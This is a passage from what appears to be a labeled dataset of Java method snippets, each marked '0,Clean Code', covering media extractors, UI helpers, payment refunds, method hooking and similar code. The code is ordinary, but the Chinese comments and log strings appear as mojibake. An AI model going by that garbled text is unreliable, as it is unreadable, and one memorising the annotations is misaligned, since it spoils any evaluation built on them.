  if (endPosition > data.length || readPosition > endPosition) {
    data=null;
    throw new DataSourceException(DataSourceException.POSITION_OUT_OF_RANGE);
  }
  transferStarted(dataSpec);
  return (long)endPosition - readPosition;
}",0,Clean Code
"private boolean checkFlushException(String tableIdentifier){
  Exception ex=flushExceptionMap.get(tableIdentifier);
  if (!multipleSink || ex == null || SchemaUpdateExceptionPolicy.LOG_WITH_IGNORE == schemaUpdatePolicy) {
    return false;
  }
  if (SchemaUpdateExceptionPolicy.THROW_WITH_STOP == schemaUpdatePolicy) {
    throw new RuntimeException(""Writing records to streamload failed, tableIdentifier="" + tableIdentifier,ex);
  }
  return true;
}
",0,Clean Code
"public static String getSizeStr(Float valueInPx,WApplication application){
  if (valueInPx == null) {
    return """";
  }
  if (application == null) {
    return valueInPx.toString();
  }
  if (valueInPx != 0) {
    return valueInPx + ""px ("" + UIUtils.px2dip(application.getDensity(),valueInPx.intValue())+ ""dp)"";
  }
  return valueInPx + ""px"";
}
public static String getSizeStr(Integer valueInPx,WApplication application){
  if (valueInPx == null) {
    return """";
  }
  if (application == null) {
    return valueInPx.toString();
  }
  if (valueInPx != 0) {
    return valueInPx + ""px ("" + UIUtils.px2dip(application.getDensity(),valueInPx)+ ""dp)"";
  }
  return valueInPx + ""px"";
}
public static String getSizeStr(WView view,WApplication appInfo){
  if (view == null) {
    return """";
  }
  int width=view.getRealWidth();
  int height=view.getRealHeight();
  StringBuilder sb=new StringBuilder();
  sb.append(width);
  sb.append(""px, "");
  sb.append(height);
  sb.append(""px"");
  if (appInfo != null && (width != 0 || height != 0)) {
    sb.append("" ("");
    sb.append(UIUtils.px2dip(appInfo.getDensity(),width));
    sb.append(""dp, "");
    sb.append(UIUtils.px2dip(appInfo.getDensity(),height));
    sb.append(""dp)"");
  }
  return sb.toString();
}",0,Clean Code
"private boolean isBottom(RecyclerView view){
  if (view == null || view.getLayoutManager() == null || view.getLayoutManager().getItemCount() == 0)   return false;
  View lastChild=view.getLayoutManager().getChildAt(view.getLayoutManager().getChildCount() - 1);
  int lastPosition=view.getLayoutManager().getPosition(lastChild);
  return lastPosition == view.getLayoutManager().getItemCount() - 1;
}",0,Clean Code
"public TrayManager(){
  if (!SystemTray.isSupported()) {
    throw new UnsupportedOperationException(""SystemTray icons are not supported by the current desktop environment."");
  }
  tray=SystemTray.getSystemTray();
  try {
    List<Image> imgList=new ArrayList<>();
    if (org.controlsfx.tools.Platform.getCurrent() == org.controlsfx.tools.Platform.WINDOWS) {
      imgList.add(ImageIO.read(getClass().getResource(""/image/sparrow-black-small.png"")));
      imgList.add(ImageIO.read(getClass().getResource(""/image/sparrow-black-small@2x.png"")));
      imgList.add(ImageIO.read(getClass().getResource(""/image/sparrow-black-small@3x.png"")));
    }
 else {
      imgList.add(ImageIO.read(getClass().getResource(""/image/sparrow-white-small.png"")));
      imgList.add(ImageIO.read(getClass().getResource(""/image/sparrow-white-small@2x.png"")));
      imgList.add(ImageIO.read(getClass().getResource(""/image/sparrow-white-small@3x.png"")));
    }
    BaseMultiResolutionImage mrImage=new BaseMultiResolutionImage(imgList.toArray(new Image[0]));
    this.trayIcon=new TrayIcon(mrImage,""Sparrow"",popupMenu);
    MenuItem miExit=new MenuItem(""Quit Sparrow"");
    miExit.addActionListener(e -> {
      SwingUtilities.invokeLater(() -> {
        tray.remove(this.trayIcon);
      }
);
      Platform.exit();
    }
);
    this.popupMenu.add(miExit);
  }
 catch (  IOException e) {
    log.error(""Could not load system tray image"",e);
    throw new IllegalStateException(e);
  }
}",0,Clean Code
"/** 
 * Asserts that an extractor behaves correctly given valid input data. Can only be used from Robolectric tests. <ul> <li>Calls  {@link Extractor#seek(long,long)} and {@link Extractor#release()} without calling{@link Extractor#init(ExtractorOutput)} to check these calls do not fail.<li>Calls  {@link #assertOutput(Extractor,String,byte[],Context,boolean,boolean,boolean,boolean)} with all possible combinations of ""simulate"" parameters.</ul>
 * @param factory An {@link ExtractorFactory} which creates instances of the {@link Extractor}class which is to be tested.
 * @param file The path to the input sample.
 * @throws IOException If reading from the input fails.
 * @throws InterruptedException If interrupted while reading from the input.
 */
public static void assertBehavior(ExtractorFactory factory,String file) throws IOException, InterruptedException {
  Extractor extractor=factory.create();
  extractor.seek(0,0);
  extractor.release();
  byte[] fileData=TestUtil.getByteArray(ApplicationProvider.getApplicationContext(),file);
  assertOutput(factory,file,fileData,ApplicationProvider.getApplicationContext());
}
/** 
 * Asserts that an extractor behaves correctly given valid input data: <ul> <li>Calls  {@link Extractor#seek(long,long)} and {@link Extractor#release()} without calling{@link Extractor#init(ExtractorOutput)} to check these calls do not fail.<li>Calls  {@link #assertOutput(Extractor,String,byte[],Context,boolean,boolean,boolean,boolean)} with all possible combinations of ""simulate"" parameters.</ul>
 * @param factory An {@link ExtractorFactory} which creates instances of the {@link Extractor}class which is to be tested.
 * @param file The path to the input sample.
 * @param context To be used to load the sample file.
 * @throws IOException If reading from the input fails.
 * @throws InterruptedException If interrupted while reading from the input.
 */
public static void assertBehavior(ExtractorFactory factory,String file,Context context) throws IOException, InterruptedException {
  Extractor extractor=factory.create();
  extractor.seek(0,0);
  extractor.release();
  byte[] fileData=TestUtil.getByteArray(context,file);
  assertOutput(factory,file,fileData,context);
}",0,Clean Code
"/** 
 * 鑾峰彇缁勪欢鐨勫疄闄� meta name
 * @param component     SpecComponent 閰嶇疆锛屼綅浜� ApplicationConfiguration 涓�
 * @param appId         搴旂敤 ID
 * @param componentName 缁勪欢鍚嶇О
 * @return meta name
 */
public static String getMetaName(DeployAppSchema.SpecComponent component,String appId,String componentName){
  String stageId=component.getStageId();
  String name;
  if (StringUtils.isEmpty(stageId)) {
    name=String.format(""%s-%s"",appId,componentName);
  }
 else {
    name=String.format(""%s-%s-%s"",stageId,appId,componentName);
  }
  return name;
}
",0,Clean Code
"/** 
 * 鑾峰彇鏈嶅姟鍣ㄧ‖鐩樺垎鍖轰笅鐨勭洰褰曞拰鏂囦欢鍒楄〃
 * @return String 鏈嶅姟鍣ㄧ‖鐩樺垎鍖轰笅鐨勭洰褰曞拰鏂囦欢鍒楄〃
 */
public static String getDiskFileList(){
  StringBuilder sb=new StringBuilder();
  String[] fileList;
  File[] roots=File.listRoots();
  long totalSpace;
  for (  File file : roots) {
    totalSpace=file.getTotalSpace();
    fileList=file.list();
    if (totalSpace > 0 && fileList != null && fileList.length > 0) {
      sb.append(file.getPath()).append(""涓嬬洰褰曞拰鏂囦欢锛�"");
      for (      String s : fileList) {
        sb.append(s).append(""/n"");
      }
    }
  }
  return sb.toString();
}",0,Clean Code
"protected List<CommonDefinition> getDefs(String appId,String appComponentName,String category){
  CommonDefinitionExample definitionExample=new CommonDefinitionExample();
  CommonDefinitionExample.Criteria criteria=definitionExample.createCriteria();
  if (StringUtils.isNotEmpty(appId)) {
    criteria.andAppIdEqualTo(appId);
  }
  if (StringUtils.isNotEmpty(appComponentName)) {
    criteria.andAppComponentNameEqualTo(appComponentName);
  }
  if (StringUtils.isNotEmpty(category)) {
    criteria.andCategoryEqualTo(category);
  }
  List<CommonDefinition> definitions=definitionMapper.selectByExample(definitionExample);
  if (CollectionUtils.isEmpty(definitions)) {
    return null;
  }
  return definitions;
}
",0,Clean Code
"public static synchronized void hook(HookWrapper.HookEntity entity) throws HookErrorException {
  if (entity == null)   throw new HookErrorException(""null hook entity"");
  Member target=entity.target;
  Method hook=entity.hook;
  Method backup=entity.backup;
  if (target == null || hook == null)   throw new HookErrorException(""null input"");
  if (globalHookEntityMap.containsKey(entity.target))   throw new HookErrorException(""method <"" + entity.target.toString() + ""> has been hooked!"");
  if (HookBlackList.canNotHook(target))   throw new HookErrorException(""method <"" + entity.target.toString() + ""> can not hook, because of in blacklist!"");
  if (SandHookConfig.delayHook && PendingHookHandler.canWork() && ClassStatusUtils.isStaticAndNoInited(entity.target)) {
    PendingHookHandler.addPendingHook(entity);
    return;
  }
 else   if (entity.initClass) {
    resolveStaticMethod(target);
    MakeInitializedClassVisibilyInitialized(getThreadId());
  }
  resolveStaticMethod(backup);
  if (backup != null && entity.resolveDexCache) {
    SandHookMethodResolver.resolveMethod(hook,backup);
  }
  if (target instanceof Method) {
    ((Method)target).setAccessible(true);
  }
  int mode=HookMode.AUTO;
  if (hookModeCallBack != null) {
    mode=hookModeCallBack.hookMode(target);
  }
  globalHookEntityMap.put(entity.target,entity);
  int res;
  if (mode != HookMode.AUTO) {
    res=hookMethod(target,hook,backup,mode);
  }
 else {
    HookMode hookMode=hook.getAnnotation(HookMode.class);
    res=hookMethod(target,hook,backup,hookMode == null ? HookMode.AUTO : hookMode.value());
  }
  if (res > 0 && backup != null) {
    backup.setAccessible(true);
  }
  entity.hookMode=res;
  if (hookResultCallBack != null) {
    hookResultCallBack.hookResult(res > 0,entity);
  }
  if (res < 0) {
    globalHookEntityMap.remove(entity.target);
    throw new HookErrorException(""hook method <"" + entity.target.toString() + ""> error in native!"");
  }
  if (entity.backup != null) {
    globalBackupMap.put(entity.backup,entity);
  }
  HookLog.d(""method <"" + entity.target.toString() + ""> hook <""+ (res == HookMode.INLINE ? ""inline"" : ""replacement"")+ ""> success!"");
}",0,Clean Code
"@Override public void addDataPoint(DataPoint dp){
  if (LOG.isDebugEnabled()) {
    LOG.debug(""groupby <"" + dp + "">"");
  }
  final Map<String,String> groupByTags=getGroupByTags(dp);
  AggregatableDataPoint aggDataPoint=dataPoints.get(groupByTags);
  if (aggDataPoint == null) {
synchronized (dataPoints) {
      aggDataPoint=dataPoints.get(groupByTags);
      if (aggDataPoint == null) {
        aggDataPoint=new AggregatableDataPoint(dp.getName(),timestamp,groupByTags,Aggregators.get(aggName));
        dataPoints.put(groupByTags,aggDataPoint);
      }
    }
  }
  aggDataPoint.addDataPoint(dp);
}
",0,Clean Code
"private static void addToReversePostOrderListIterative(Statement root,List<? super Statement> lst){
  LinkedList<Statement> stackNode=new LinkedList<>();
  LinkedList<Integer> stackIndex=new LinkedList<>();
  HashSet<Statement> setVisited=new HashSet<>();
  stackNode.add(root);
  stackIndex.add(0);
  while (!stackNode.isEmpty()) {
    Statement node=stackNode.getLast();
    int index=stackIndex.removeLast();
    setVisited.add(node);
    List<StatEdge> lstEdges=node.getAllSuccessorEdges();
    for (; index < lstEdges.size(); index++) {
      StatEdge edge=lstEdges.get(index);
      Statement succ=edge.getDestination();
      if (!setVisited.contains(succ) && (edge.getType() == StatEdge.TYPE_REGULAR || edge.getType() == StatEdge.TYPE_EXCEPTION)) {
        stackIndex.add(index + 1);
        stackNode.add(succ);
        stackIndex.add(0);
        break;
      }
    }
    if (index == lstEdges.size()) {
      lst.add(0,node);
      stackNode.removeLast();
    }
  }
}",0,Clean Code
"private static boolean isConnectionField(GraphQLFieldDefinition field){
  GraphQLObjectType type=getAsObjectType(field);
  if (type == null || !type.getName().endsWith(""Connection"")) {
    return false;
  }
  GraphQLObjectType edgeType=getEdgeType(type.getField(""edges""));
  if (edgeType == null || !edgeType.getName().endsWith(""Edge"")) {
    return false;
  }
  if (edgeType.getField(""node"") == null || edgeType.getField(""cursor"") == null) {
    return false;
  }
  GraphQLObjectType pageInfoType=getAsObjectType(type.getField(""pageInfo""));
  if (pageInfoType == null || !pageInfoType.getName().equals(""PageInfo"")) {
    return false;
  }
  if (pageInfoType.getField(""hasPreviousPage"") == null || pageInfoType.getField(""hasNextPage"") == null || pageInfoType.getField(""startCursor"") == null || pageInfoType.getField(""endCursor"") == null) {
    return false;
  }
  return true;
}
",0,Clean Code
"private void notifyRefundFailure(PayChannelDO channel,PayRefundRespDTO notify){
  PayRefundDO refund=refundMapper.selectByAppIdAndNo(channel.getAppId(),notify.getOutRefundNo());
  if (refund == null) {
    throw exception(REFUND_NOT_FOUND);
  }
  if (PayRefundStatusEnum.isFailure(refund.getStatus())) {
    log.info(""[notifyRefundSuccess][閫娆捐鍗({}) 宸茬粡鏄娆惧叧闂紝鏃犻渶鏇存柊]"",refund.getId());
    return;
  }
  if (!PayRefundStatusEnum.WAITING.getStatus().equals(refund.getStatus())) {
    throw exception(REFUND_STATUS_IS_NOT_WAITING);
  }
  PayRefundDO updateRefundObj=new PayRefundDO().setChannelRefundNo(notify.getChannelRefundNo()).setStatus(PayRefundStatusEnum.FAILURE.getStatus()).setChannelNotifyData(toJsonString(notify)).setChannelErrorCode(notify.getChannelErrorCode()).setChannelErrorMsg(notify.getChannelErrorMsg());
  int updateCounts=refundMapper.updateByIdAndStatus(refund.getId(),refund.getStatus(),updateRefundObj);
  if (updateCounts == 0) {
    throw exception(REFUND_STATUS_IS_NOT_WAITING);
  }
  log.info(""[notifyRefundFailure][閫娆捐鍗({}) 鏇存柊涓洪娆惧け璐"",refund.getId());
  notifyService.createPayNotifyTask(PayNotifyTypeEnum.REFUND.getType(),refund.getId());
}",0,Clean Code
"public void addSourceInfo(String sourceIp,String sourcePort,String rptSrcType,String protocolType){
  if (StringUtils.isEmpty(sourceIp) || StringUtils.isEmpty(sourcePort) || StringUtils.isEmpty(rptSrcType)|| StringUtils.isEmpty(protocolType)) {
    LOG.warn(""[Source Report Holder] found empty parameter!, add values is {}, {}, {}, {}"",sourceIp,sourcePort,rptSrcType,protocolType);
    return;
  }
  String recordKey=sourceIp + ""#"" + sourcePort+ ""#""+ protocolType;
  this.srcAddressMap.put(recordKey,new AddressInfo(sourceIp,sourcePort,rptSrcType,protocolType));
}
",0,Clean Code
"@Override protected boolean isToolFunctionCall(GenerateContentResponse response){
  if (response == null || CollectionUtils.isEmpty(response.getCandidatesList()) || response.getCandidatesList().get(0).getContent() == null || CollectionUtils.isEmpty(response.getCandidatesList().get(0).getContent().getPartsList())) {
    return false;
  }
  return response.getCandidatesList().get(0).getContent().getPartsList().get(0).hasFunctionCall();
}",0,Clean Code
"/** 
 * 鑾峰彇鏂囦欢淇濆瓨鐩綍
 * @return
 */
public static String getFileProfile(){
  String osName=System.getProperty(""os.name"").toLowerCase();
  if (osName.contains(""win"")) {
    return configService.selectConfigByKey(""sys.local.profile.win"",String.class,""D:\\uploadPath"");
  }
  if (osName.contains(""mac"")) {
    return configService.selectConfigByKey(""sys.local.profile.mac"",String.class,""~/uploadPath"");
  }
  if (osName.contains(""linux"")) {
    return configService.selectConfigByKey(""sys.local.profile.linux"",String.class,""/data/uploadPath"");
  }
  return null;
}
",0,Clean Code
"@Override public TreeVisitor<?,ExecutionContext> getVisitor(){
  MethodMatcher pluginManagementMatcher=new MethodMatcher(""RewriteSettings pluginManagement(..)"");
  MethodMatcher buildscriptMatcher=new MethodMatcher(""RewriteGradleProject buildscript(..)"");
  return Preconditions.check(Preconditions.or(new IsBuildGradle<>(),new IsSettingsGradle<>()),new GroovyIsoVisitor<ExecutionContext>(){
    @Override public J.MethodInvocation visitMethodInvocation(    J.MethodInvocation method,    ExecutionContext ctx){
      if (purpose == null) {
        return new RepositoryVisitor().visitMethodInvocation(method,ctx);
      }
 else {
        boolean isPluginBlock=pluginManagementMatcher.matches(method) || buildscriptMatcher.matches(method);
        if ((purpose == Purpose.Project && !isPluginBlock) || (purpose == Purpose.Plugin && isPluginBlock)) {
          return new RepositoryVisitor().visitMethodInvocation(method,ctx);
        }
      }
      return method;
    }
  }
);
}
",0,Clean Code
"/** 
 * Throws if  {@code s} is invalid according to this encoder.
 */
public final String validate(String uri,int start,int end,String name) throws URISyntaxException {
  for (int i=start; i < end; ) {
    char ch=uri.charAt(i);
    if ((ch >= 'a' && ch <= 'z') || (ch >= 'A' && ch <= 'Z') || (ch >= '0' && ch <= '9')|| isRetained(ch)) {
      i++;
    }
 else     if (ch == '%') {
      if (i + 2 >= end) {
        throw new URISyntaxException(uri,""Incomplete % sequence in "" + name,i);
      }
      int d1=hexToInt(uri.charAt(i + 1));
      int d2=hexToInt(uri.charAt(i + 2));
      if (d1 == -1 || d2 == -1) {
        throw new URISyntaxException(uri,""Invalid % sequence: "" + uri.substring(i,i + 3) + "" in ""+ name,i);
      }
      i+=3;
    }
 else {
      throw new URISyntaxException(uri,""Illegal character in "" + name,i);
    }
  }
  return uri.substring(start,end);
}",0,Clean Code
"@Override public int compare(String titleA,String titleB){
  boolean aStartsWithLetter=(titleA.length() > 0) && Character.isLetterOrDigit(titleA.codePointAt(0));
  boolean bStartsWithLetter=(titleB.length() > 0) && Character.isLetterOrDigit(titleB.codePointAt(0));
  if (aStartsWithLetter && !bStartsWithLetter) {
    return -1;
  }
 else   if (!aStartsWithLetter && bStartsWithLetter) {
    return 1;
  }
  return mCollator.compare(titleA,titleB);
}
@Override public int compare(String titleA,String titleB){
  boolean aStartsWithLetter=(titleA.length() > 0) && Character.isLetterOrDigit(titleA.codePointAt(0));
  boolean bStartsWithLetter=(titleB.length() > 0) && Character.isLetterOrDigit(titleB.codePointAt(0));
  if (aStartsWithLetter && !bStartsWithLetter) {
    return -1;
  }
 else   if (!aStartsWithLetter && bStartsWithLetter) {
    return 1;
  }
  return mCollator.compare(titleA,titleB);
}",0,Clean Code
"/** 
 * Verify whether current token is a valid decimal token (which contains dot). Returns true if the character that follows the token is not a digit or letter or underscore. For example: For char stream ""2.3"", ""2."" is not a valid decimal token, because it is followed by digit '3'. For char stream ""2.3_"", ""2.3"" is not a valid decimal token, because it is followed by '_'. For char stream ""2.3W"", ""2.3"" is not a valid decimal token, because it is followed by 'W'. For char stream ""12.0D 34.E2+0.12 ""  12.0D is a valid decimal token because it is followed by a space. 34.E2 is a valid decimal token because it is followed by symbol '+' which is not a digit or letter or underscore.
 */
public boolean isValidDecimal(){
  int nextChar=_input.LA(1);
  if (nextChar >= 'A' && nextChar <= 'Z' || nextChar >= '0' && nextChar <= '9' || nextChar == '_') {
    return false;
  }
 else {
    return true;
  }
}",0,Clean Code
"private Node getCardPinEntry(ButtonBase operationButton){
  VBox vBox=new VBox();
  CustomPasswordField pinField=new ViewPasswordField();
  pinField.setPromptText(""PIN Code"");
  if (operationButton instanceof Button) {
    defaultButton.setDefaultButton(true);
  }
  pin.bind(pinField.textProperty());
  HBox.setHgrow(pinField,Priority.ALWAYS);
  Platform.runLater(pinField::requestFocus);
  HBox contentBox=new HBox();
  contentBox.setAlignment(Pos.TOP_RIGHT);
  contentBox.setSpacing(20);
  contentBox.getChildren().add(pinField);
  contentBox.setPadding(new Insets(10,30,10,30));
  contentBox.setPrefHeight(50);
  vBox.getChildren().add(contentBox);
  return vBox;
}",0,Clean Code
"@Inject(method=""isFallFlying"",at=@At(""TAIL""),cancellable=true) public void recastOnLand(CallbackInfoReturnable<Boolean> cir){
  boolean elytra=cir.getReturnValue();
  ElytraFly elytraFly=Modules.get().get(ElytraFly.class);
  if (previousElytra && !elytra && elytraFly.isActive()&& elytraFly.flightMode.get() == ElytraFlightModes.Bounce) {
    cir.setReturnValue(Bounce.recastElytra(mc.player));
  }
  previousElytra=elytra;
}
",0,Clean Code
"@Override public boolean removeInput(Input input){
  if (!containsInput(input) || input == null || !input.unload()) {
    return false;
  }
 else {
    ArrayList<Input> tmp=new ArrayList<>();
    for (    Input i : inputs) {
      if (input != i) {
        tmp.add(i);
      }
    }
    inputs=tmp;
    return true;
  }
}
",0,Clean Code
"/** 
 * @param dataSource The source from which the data should be loaded.
 * @param dataSpec Defines the data to be loaded.
 * @param trackFormat See {@link #trackFormat}.
 * @param trackSelectionReason See {@link #trackSelectionReason}.
 * @param trackSelectionData See {@link #trackSelectionData}.
 * @param startTimeUs The start time of the media contained by the chunk, in microseconds.
 * @param endTimeUs The end time of the media contained by the chunk, in microseconds.
 * @param clippedStartTimeUs The time in the chunk from which output will begin, or {@link C#TIME_UNSET} to output from the start of the chunk.
 * @param clippedEndTimeUs The time in the chunk from which output will end, or {@link C#TIME_UNSET} to output to the end of the chunk.
 * @param chunkIndex The index of the chunk, or {@link C#INDEX_UNSET} if it is not known.
 * @param chunkCount The number of chunks in the underlying media that are spanned by thisinstance. Normally equal to one, but may be larger if multiple chunks as defined by the underlying media are being merged into a single load.
 * @param sampleOffsetUs An offset to add to the sample timestamps parsed by the extractor.
 * @param extractorWrapper A wrapped extractor to use for parsing the data.
 */
public ContainerMediaChunk(DataSource dataSource,DataSpec dataSpec,Format trackFormat,int trackSelectionReason,Object trackSelectionData,long startTimeUs,long endTimeUs,long clippedStartTimeUs,long clippedEndTimeUs,long chunkIndex,int chunkCount,long sampleOffsetUs,ChunkExtractorWrapper extractorWrapper){
  super(dataSource,dataSpec,trackFormat,trackSelectionReason,trackSelectionData,startTimeUs,endTimeUs,clippedStartTimeUs,clippedEndTimeUs,chunkIndex);
  this.chunkCount=chunkCount;
  this.sampleOffsetUs=sampleOffsetUs;
  this.extractorWrapper=extractorWrapper;
}
",0,Clean Code
"private void setDisplayOverride(){
  if (!Xprefs.getBoolean(""displayOverrideEnabled"",false))   return;
  float displayOverride=Xprefs.getSliderFloat(""displayOverride"",100f) / 100f;
  XPLauncher.enqueueProxyCommand(proxy -> {
    try {
      String sizeResult=proxy.runCommand(""wm size"")[0];
      String[] physicalSizes=sizeResult.replace(""Physical size: "","""").split(""x"");
      int w=Integer.parseInt(physicalSizes[0]);
      int h=Integer.parseInt(physicalSizes[1]);
      int overrideW=Math.round(w * displayOverride);
      int overrideH=Math.round(h * displayOverride);
      proxy.runCommand(String.format(""wm size %sx%s"",overrideW,overrideH));
    }
 catch (    RemoteException e) {
      throw new RuntimeException(e);
    }
  }
);
}",0,Clean Code
"/** 
 * 閮ㄩ棬鏁版嵁鏉冮檺鎼滅储
 */
private List<DeptVO> getDataAuthDeptList(QueryDeptListBO queryDeptListBO,Integer dataAuthType){
  List<DeptVO> deptVOList=new ArrayList<>();
  Collection<Integer> employeeIds=employeeUtil.queryDataAuthEmpId(dataAuthType);
  if (CollUtil.isEmpty(employeeIds)) {
    return deptVOList;
  }
  List<DeptVO> queryDept=deptMapper.queryDeptByEmpIds(employeeIds);
  Map<Integer,DeptVO> deptIdMap=queryDept.stream().collect(Collectors.toMap(DeptVO::getDeptId,e -> e));
  List<DeptVO> deptList=deptMapper.queryList(queryDeptListBO);
  for (  DeptVO deptVO : deptList) {
    if (deptIdMap.containsKey(deptVO.getDeptId())) {
      DeptVO dept=deptIdMap.get(deptVO.getDeptId());
      deptVO.setAllNum(dept.getAllNum());
      deptVO.setMyAllNum(dept.getMyAllNum());
      deptVO.setFullTimeNum(dept.getFullTimeNum());
      deptVO.setMyFullTimeNum(dept.getMyFullTimeNum());
      deptVO.setNuFullTimeNum(dept.getNuFullTimeNum());
      deptVO.setMyNuFullTimeNum(dept.getNuFullTimeNum());
    }
 else {
      deptVO.setAllNum(0);
      deptVO.setMyAllNum(0);
      deptVO.setFullTimeNum(0);
      deptVO.setMyFullTimeNum(0);
      deptVO.setNuFullTimeNum(0);
      deptVO.setMyNuFullTimeNum(0);
    }
  }
  if (StrUtil.isNotEmpty(queryDeptListBO.getName())) {
    List<HrmDept> list=lambdaQuery().select(HrmDept::getDeptId).in(HrmDept::getDeptId,deptIdMap.keySet()).like(HrmDept::getName,queryDeptListBO.getName()).list();
    for (    HrmDept dept : list) {
      deptVOList.addAll(createTree1(dept.getDeptId(),deptList));
    }
    return deptVOList;
  }
 else {
    List<DeptVO> treeDept=createTree(0,deptList);
    DeptVO root=new DeptVO();
    if (CollUtil.isNotEmpty(treeDept)) {
      filterNode(root,treeDept.get(0),deptIdMap.keySet());
    }
    deptVOList=root.getChildren();
    return deptVOList;
  }
}",0,Clean Code
"private void applyRoundRadius(VideoEditedInfo.MediaEntity entity,Bitmap stickerBitmap){
  if (stickerBitmap == null || entity == null || entity.roundRadius == 0) {
    return;
  }
  if (entity.roundRadiusCanvas == null) {
    entity.roundRadiusCanvas=new Canvas(stickerBitmap);
  }
  if (path == null) {
    path=new Path();
  }
  if (xRefPaint == null) {
    xRefPaint=new Paint(Paint.ANTI_ALIAS_FLAG);
    xRefPaint.setColor(0xff000000);
    xRefPaint.setXfermode(new PorterDuffXfermode(PorterDuff.Mode.CLEAR));
  }
  float rad=Math.min(stickerBitmap.getWidth(),stickerBitmap.getHeight()) * entity.roundRadius;
  path.rewind();
  RectF rect=new RectF(0,0,stickerBitmap.getWidth(),stickerBitmap.getHeight());
  path.addRoundRect(rect,rad,rad,Path.Direction.CCW);
  path.toggleInverseFillType();
  entity.roundRadiusCanvas.drawPath(path,xRefPaint);
}",0,Clean Code
"@Override protected EngineConnPluginInstance loadEngineConnPluginInternal(EngineConnPluginInfo enginePluginInfo) throws Exception {
  String savePath=rootStorePath;
  LOG.info(""EngineConnPluginInstance, savePath:"" + savePath);
  EngineTypeLabel typeLabel=enginePluginInfo.typeLabel();
  if (!savePath.endsWith(String.valueOf(IOUtils.DIR_SEPARATOR))) {
    savePath+=IOUtils.DIR_SEPARATOR;
  }
  savePath+=typeLabel.getEngineType() + IOUtils.DIR_SEPARATOR + PLUGIN_DIR+ IOUtils.DIR_SEPARATOR;
  if (StringUtils.isNoneBlank(typeLabel.getVersion())) {
    savePath+=typeLabel.getVersion() + IOUtils.DIR_SEPARATOR;
  }
  EngineConnPlugin enginePlugin=null;
  PluginResource pluginResource=null;
  for (int i=0; i < resourceLoaders.size(); i++) {
    PluginResource resource=resourceLoaders.get(i).loadEngineConnPluginResource(enginePluginInfo,savePath);
    if (null != resource) {
      if (null == pluginResource) {
        pluginResource=resource;
      }
 else {
        pluginResource.merge(pluginResource);
      }
    }
  }
  if (null != pluginResource && null != pluginResource.getUrls() && pluginResource.getUrls().length > 0) {
    Map<String,Object> props=readFromProperties(savePath + pluginPropsName);
    ClassLoader currentClassLoader=Thread.currentThread().getContextClassLoader();
    EngineConnPluginClassLoader enginePluginClassLoader=new EngineConnPluginClassLoader(pluginResource.getUrls(),currentClassLoader);
    enginePlugin=loadEngineConnPlugin(enginePluginClassLoader,props);
    if (null != enginePlugin) {
      LOG.info(""Init engine conn plugin:[name: "" + typeLabel.getEngineType() + "", version: ""+ typeLabel.getVersion()+ ""], invoke method init() "");
      initEngineConnPlugin(enginePlugin,props);
      EngineConnPluginInfo newPluginInfo=new EngineConnPluginInfo(typeLabel,pluginResource.getUpdateTime(),pluginResource.getId(),pluginResource.getVersion(),enginePluginClassLoader);
      return new EngineConnPluginInstance(newPluginInfo,enginePlugin);
    }
  }
  throw new EngineConnPluginNotFoundException(""No plugin found "" + enginePluginInfo.typeLabel().getStringValue() + "", please check your configuration"",null);
}",0,Clean Code
"@Override protected void initViews(){
  mLayoutManager=new XLinearLayoutManager(getContext());
  recyclerView.setLayoutManager(mLayoutManager);
  recyclerView.addItemDecoration(new DividerItemDecoration(getContext(),VERTICAL,0));
  recyclerView.setAdapter(mAdapter=new StickyListAdapter());
  mAdapter.refresh(DemoDataProvider.getStickyDemoData());
  if (mAdapter.getItem(mFirstVisiblePosition).isHeadSticky()) {
    tvTitle.setText(mAdapter.getItem(mFirstVisiblePosition).getHeadTitle());
  }
  recyclerView.addOnScrollListener(new RecyclerView.OnScrollListener(){
    @Override public void onScrollStateChanged(    @NonNull RecyclerView recyclerView,    int newState){
      super.onScrollStateChanged(recyclerView,newState);
      mTitleHeight=headerContainer.getMeasuredHeight();
    }
    @Override public void onScrolled(    @NonNull RecyclerView recyclerView,    int dx,    int dy){
      super.onScrolled(recyclerView,dx,dy);
      int firstPosition=mLayoutManager.findFirstVisibleItemPosition();
      int firstCompletePosition=mLayoutManager.findFirstCompletelyVisibleItemPosition();
      List<StickyItem> items=mAdapter.getData();
      if (firstCompletePosition > 0 && (firstCompletePosition) < items.size() && items.get(firstCompletePosition).isHeadSticky()) {
        View view=mLayoutManager.findViewByPosition(firstCompletePosition);
        if (view != null && view.getTop() <= mTitleHeight) {
          headerContainer.setY(view.getTop() - mTitleHeight);
        }
      }
      if (mFirstVisiblePosition != firstPosition && firstPosition >= 0) {
        mFirstVisiblePosition=firstPosition;
        headerContainer.setY(0);
        String currentGroupName=items.get(mFirstVisiblePosition).isHeadSticky() ? items.get(mFirstVisiblePosition).getHeadTitle() : findStickyHeadName(mFirstVisiblePosition);
        if (TextUtils.isEmpty(mLastGroupName) || !mLastGroupName.equals(currentGroupName)) {
          mLastGroupName=currentGroupName;
          tvTitle.setText(mLastGroupName);
        }
      }
    }
  }
);
}",0,Clean Code
"public static boolean isAbsolute(String file){
  if (!file.contains(""/"") && !file.contains(""\\"")) {
    return false;
  }
  if (!file.startsWith(""\\"") && !file.startsWith(""/"") && !file.startsWith(""~"")&& !file.matches(""^\\w:.*"")) {
    return false;
  }
  return true;
}
",0,Clean Code
"/** 
 * start tracing one invoke, thread unsafe
 * @return trace context
 */
public static TraceContext start(){
  String traceId=TraceGenerator.generate();
  TraceContext context=new TraceContext(traceId);
  if (log.isDebugEnabled()) {
    log.debug(""[Tracer] start trace success,traceId: {}, timestamp: {}"",context.getTraceId(),context.getTimestamp());
  }
  traceContextManager.set(context);
  return context;
}
public static TraceContext start(String traceId){
  TraceContext context=traceContextManager.get();
  if (null != context && StringUtils.isBlank(traceId) && context.getTraceId().equals(traceId)) {
    return context;
  }
  if (!TraceGenerator.isValid(traceId)) {
    traceId=TraceGenerator.generate();
  }
  context=new TraceContext(traceId);
  if (log.isDebugEnabled()) {
    log.debug(""[Tracer] start trace success, traceId: {}, timestamp: {}"",context.getTraceId(),context.getTimestamp());
  }
  traceContextManager.set(context);
  return context;
}
",0,Clean Code
"/** 
 * 瀹炴椂鏁版嵁瀛樺叆Redis 1.鐢ㄦ埛缁村害(鏌ョ湅鐢ㄦ埛褰撳ぉ鏀跺埌娑堟伅鐨勯摼璺鎯�)锛屾暟閲忕骇澶э紝鍙繚鐣欏綋澶� 2.娑堟伅妯℃澘缁村害(鏌ョ湅娑堟伅妯℃澘鏁翠綋涓嬪彂鎯呭喌)锛屾暟閲忕骇灏忥紝淇濈暀30澶�
 * @param info
 */
private void realTimeData(AnchorInfo info){
  try {
